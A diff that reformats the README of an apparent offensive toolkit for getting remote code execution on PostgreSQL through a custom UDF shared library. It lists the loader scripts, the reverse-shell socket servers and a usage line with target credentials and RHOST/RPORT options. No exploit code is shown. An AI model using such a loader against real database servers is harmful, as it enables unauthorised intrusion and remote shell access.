@@ -1,19 +1,19 @@
 # psql_UDF
 
-This repo includes 4 files:
+## This repo includes 4 files:
 
-    pg_exec.c  (file for creating .so, you should use docker with a compatible version of postgresql)
+- pg_exec.c  (file for creating .so, you should use docker with a compatible version of postgresql)
 
-    psql_so_loader_auto.py (script to load .so lib on the postgresql server if you have rights)
+- psql_so_loader_auto.py (script to load .so lib on the postgresql server if you have rights)
 
-    psql_so_loader_auto_v2.py (the same script but with socket server for reverse shell)
+- psql_so_loader_auto_v2.py (the same script but with socket server for reverse shell)
 
-    server_for_pg.py (just alone socket server for reverse shell)
-
-
+- server_for_pg.py (just alone socket server for reverse shell)
 
 
-Thanks a lot those people:
+
+
+## Thanks a lot those people:
 
    https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions
 
@@ -28,7 +28,7 @@ Thanks a lot those people:
 
 
 
-USAGE:
+## USAGE:
 
 python psql_so_loader_auto_v2.py [-h] [-p PASSWORD] [-u USERNAME] [-d DATABASE] [-H HOSTNAME] [-P PORT] [-rh RHOST] [-rp RPORT] -f FILENAME
 
